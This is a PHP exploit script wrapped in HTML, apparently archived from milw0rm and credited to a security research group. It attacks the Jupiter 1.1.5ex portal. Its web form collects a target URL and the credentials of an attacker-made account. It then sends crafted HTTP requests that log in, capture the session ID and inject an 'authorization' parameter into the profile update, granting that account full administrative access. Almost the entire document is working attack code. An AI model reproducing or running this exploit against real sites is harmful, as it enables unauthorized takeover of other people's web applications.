<html><head><title>Jupiter 1.1.5ex Privileges Escalation Exploit</title></head><pre>&lt;?php
########################## WwW.BugReport.ir ###########################################
#
#      AmnPardaz Security Research &amp; Penetration Testing Group
#
# Title: Jupiter 1.1.5ex Privileges Escalation
# Vendor: http://www.jupiterportal.com
# original advisory: http://www.bugreport.ir/?/23
#######################################################################################
?&gt;

&lt;html dir=&quot;ltr&quot;&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
&lt;title&gt;Jupiter 1.1.5ex Privileges Escalation&lt;/title&gt;
&lt;style type=&quot;text/css&quot; media=&quot;screen&quot;&gt;
body {
	font-size: 10px;
	font-family: verdana;
}
INPUT {
	BORDER-TOP-WIDTH: 1px; FONT-WEIGHT: bold; BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 10px; BORDER-LEFT-COLOR: #D50428; BACKGROUND: #590009; BORDER-BOTTOM-WIDTH: 1px; BORDER-BOTTOM-COLOR: #D50428; COLOR: #00ff00; BORDER-TOP-COLOR: #D50428; FONT-FAMILY: verdana; BORDER-RIGHT-WIDTH: 1px; BORDER-RIGHT-COLOR: #D50428
}
&lt;/style&gt;
&lt;/head&gt;
&lt;body dir=&quot;ltr&quot; alink=&quot;#00ff00&quot;  bgcolor=&quot;#000000&quot; link=&quot;#00c000&quot; text=&quot;#008000&quot; vlink=&quot;#00c000&quot;&gt;
&lt;form method=&quot;POST&quot; action=&quot;?&quot;&gt;
Target URL (whit trailing slash) :&lt;BR&gt;&lt;BR&gt;
http://&lt;input type=&quot;text&quot; name=&quot;target&quot; value=&quot;www.example.com/jupiter/&quot; size=&quot;50&quot;&gt;&lt;BR&gt;&lt;BR&gt;
Username :&lt;BR&gt;&lt;BR&gt;
&lt;input type=&quot;text&quot; name=&quot;username&quot; size=&quot;30&quot;&gt;&lt;BR&gt;&lt;BR&gt;
Password :&lt;BR&gt;&lt;BR&gt;
&lt;input type=&quot;text&quot; name=&quot;password&quot; size=&quot;30&quot;&gt;&lt;BR&gt;&lt;BR&gt;
*First Create an account on target!&lt;BR&gt;
The exploit will login with this username and password and then grants full access to this account!&lt;BR&gt;&lt;BR&gt;
&lt;input type=&quot;submit&quot; name=&quot;start&quot; value=&quot;Start&quot;&gt;
&lt;/form&gt;
&lt;?php
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;, 2);

function sendpacket($packet)
{
	global $host, $html;
	$port  = 80;
	
	$ock=fsockopen(gethostbyname($host),$port);
	if ($ock)
	{
		fputs($ock,$packet);
		$html='';
		while (!feof($ock))
		{
			$html.=fgets($ock);
		}
		fclose($ock);
		// echo nl2br(htmlentities($html));
	}else die('&lt;BR&gt;No response from '.htmlentities($host).'&lt;BR&gt;');
}

if(isset($_POST['start']))
{
	if ($_POST['target'] == '' || $_POST['username'] == '' || $_POST['username'] == '')
	{
		die('Error : All fields are required!');
	}
	$Target   = trim($_POST['target']);
	$Username = trim($_POST['username']);
	$Password = trim($_POST['password']);
	$Target  .= ($Target[strlen($Target)-1] &lt;&gt; '/') ? '/' : '';
	$host     = substr($Target, 0 ,strpos($Target, '/'));
	$path     = substr($Target, strpos($Target, '/'));
	$Query1   = $path.'index.php';
	$packet1  = &quot;HEAD $Query1 HTTP/1.1\r\n&quot;;
	$packet1 .= &quot;User-Agent: Shareaza v1.x.x.xx\r\n&quot;;
	$packet1 .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
	$packet1 .= &quot;Connection: Close\r\n\r\n&quot;;
	sendpacket($packet1);
	echo nl2br(htmlentities($html));
	$Pattern  = &quot;(PHPSESSID=[a-z0-9]{20,32})&quot;;
	if(preg_match($Pattern, $html, $Matches))
	{
		$Match = $Matches[0];
		$PHPSESSID = substr($Match, 10, strlen($Match));
	}
	$Query2   = $path.'index.php?n=modules/login';
	$packet2  = &quot;POST $Query2&amp;username=$Username&amp;password=$Password&amp;submit=Login&amp;PHPSESSID=$PHPSESSID HTTP/1.1\r\n&quot;;
	$packet2 .= &quot;User-Agent: Shareaza v1.x.x.xx\r\n&quot;;
	$packet2 .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
	$packet2 .= &quot;Connection: Close\r\n\r\n&quot;;
	sendpacket($packet2);
	if(stristr($html , 'i=1') == true)
	{
		die('Error : Incorrect username or password! Try again!');
	} else
	if(stristr($html , 'i=5') == true)
	{
		die('Error : Someone is currently using that account!');
	} else
	$RandMail = substr($PHPSESSID, 10, 6).'_mail@none.com';
	$Query3   = $path.'index.php?n=modules/panel&amp;a=2&amp;tmp[authorization]=4';
	$packet3  = &quot;POST $Query3&amp;editpassword=&amp;editpassword2=&amp;editemail=$RandMail&amp;edittemplate=default&amp;editurl=&amp;editflag=none&amp;editday=0&amp;editmonth=0&amp;edityear=0&amp;edithideemail=0&amp;editcalendarbday=0&amp;editmsn=&amp;edityahoo=&amp;editicq=&amp;editaim=&amp;editskype=&amp;editsignature=&amp;editaboutme=&amp;PHPSESSID=$PHPSESSID HTTP/1.1\r\n&quot;;
	$packet3 .= &quot;User-Agent: Shareaza v1.x.x.xx\r\n&quot;;
	$packet3 .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
	$packet3 .= &quot;Connection: Close\r\n\r\n&quot;;
	sendpacket($packet3);
	if(stristr($html , 'i=26') == false)
	{
		die('Exploit Failed');
	}
	$Query4   = $path.'index.php?n=modules/login&amp;a=1';
	$packet4  = &quot;POST $Query4&amp;PHPSESSID=$PHPSESSID HTTP/1.1\r\n&quot;;
	$packet4 .= &quot;User-Agent: Shareaza v1.x.x.xx\r\n&quot;;
	$packet4 .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
	$packet4 .= &quot;Connection: Close\r\n\r\n&quot;;
	sendpacket($packet4);
	die('Exploit succeeded! You have Full access now!');
}	
?&gt;

# milw0rm.com [2007-12-24]</pre></html>